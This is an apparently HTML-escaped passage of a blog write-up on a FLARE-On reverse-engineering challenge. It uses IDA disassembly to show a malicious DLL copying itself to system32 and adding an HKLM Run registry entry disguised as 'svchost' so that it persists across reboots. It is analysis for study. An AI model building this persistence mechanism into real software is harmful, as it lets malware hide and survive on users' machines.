&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A611&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A613&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;sub&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0Ch&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A616&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;lea&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;phkResult&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A619&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; phkResult&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A61A&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;offset&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;aSoftwareMicr_0&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;; &amp;quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&amp;quot;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A61F&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #2AA198&#34;&gt;80000002h&lt;/span&gt;       &lt;span style=&#34;color: #586E75&#34;&gt;; hKey   &amp;quot;HKEY_LOCAL_MACHINE&amp;quot;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A624&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ds&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;RegCreateKeyA&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A62A&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_C&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A62D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;cmp&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_C&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A631&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;jnz&lt;/span&gt;     &lt;span style=&#34;color: #268BD2&#34;&gt;short&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_1000A663&lt;/span&gt;

&lt;span style=&#34;color: #586E75&#34;&gt;; Continue if RegCreateKey was successful&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A633&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;lpData&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;  &lt;span style=&#34;color: #586E75&#34;&gt;; &amp;quot;c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll&amp;quot;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A636&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; char *&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A637&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;_strlen&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A63C&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;add&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A63F&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; cbData - strlen(lpData)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A640&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;lpData&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A643&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; lpData - ; &amp;quot;c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll&amp;quot;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A644&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;               &lt;span style=&#34;color: #586E75&#34;&gt;; dwType&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A646&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;               &lt;span style=&#34;color: #586E75&#34;&gt;; Reserved&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A648&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;offset&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;aSvchost_0&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;; &amp;quot;svchost&amp;quot;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A64D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;phkResult&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A650&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; hKey&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A651&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ds&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;RegSetValueExA&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A657&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A65E&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A661&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;jmp&lt;/span&gt;     &lt;span style=&#34;color: #268BD2&#34;&gt;short&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_1000A673&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A673&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_1000A673&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A673&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A675&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;pop&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A676&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;retn&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Line 9 pushes &lt;code&gt;c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll&lt;/code&gt; to the stack and calls &lt;code&gt;sub_1000A610&lt;/code&gt; in line 10. Based on this string and checking for existence of the registry key we can guess what is going to happen in this function.&lt;/p&gt;

&lt;p&gt;Inside this function we see that &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/ms724842%28v=vs.85%29.aspx&#34; target=&#34;_blank&#34;&gt;RegCreateKey&lt;/a&gt; to open &lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt;. If the key does not exist, it will create it.&lt;/p&gt;

&lt;p&gt;If call was successful, execution continues to line 14. It is adding a new registry key named &lt;code&gt;svchost&lt;/code&gt; to that path with the specified value. Then function will return with the result value of RegSetValueEx. If it was successful, it will be 0.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;The Dll copied itself to system32 and it will run every time Windows starts&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Returning from sub_1000A610&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A757&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ds&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;CopyFileA&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A75D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_124&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A763&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A764&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_1000A610&lt;/span&gt;     &lt;span style=&#34;color: #586E75&#34;&gt;; Create registry key&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A769&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;add&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A76C&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_114&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;   &lt;span style=&#34;color: #586E75&#34;&gt;; Not used anymore&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A772&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_1000A772&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A772&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_1000A4C0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A777&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_118&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A77D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_118&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A783&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A786&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;xor&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A788&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #93A1A1&#34;&gt;@&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;__security_check_cookie@4&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;; __security_check_cookie(x)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A78D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A78F&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;pop&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A790&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;retn&lt;/span&gt;    &lt;span style=&#34;color: #2AA198&#34;&gt;0Ch&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A790&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;_DllMain@12&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;endp&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A790&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;After we return from &lt;code&gt;sub_1000A610&lt;/code&gt;, we land in line 5. Return value will be saved in &lt;code&gt;var_114&lt;/code&gt; (0 is key was created). If we highlight this variable and press &lt;code&gt;x&lt;/code&gt; in IDA to get external references (meaning where else this variable is being referenced and manipulated. It is not referenced anymore so we do not care about it. In line 8, a new function is called &lt;code&gt;sub_1000A4C0&lt;/code&gt;. Let&amp;rsquo;s go inside.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/5-4.jpg&#34; alt=&#34;1000A4C0&#34; title=&#34;1000A4C0&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Inside &lt;code&gt;sub_1000A4C0&lt;/code&gt; we can see that the jump to return is never taken. Because eax is set to 1 and then checked for being zero and if zero the function will return. So let&amp;rsquo;s look at the other branch.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;sub_1000A4C0&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A4D3&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;_rand&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A4D8&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;cdq&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A4D9&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0C8h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A4DE&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;idiv&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A4E0&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;add&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;32h&lt;/span&gt;
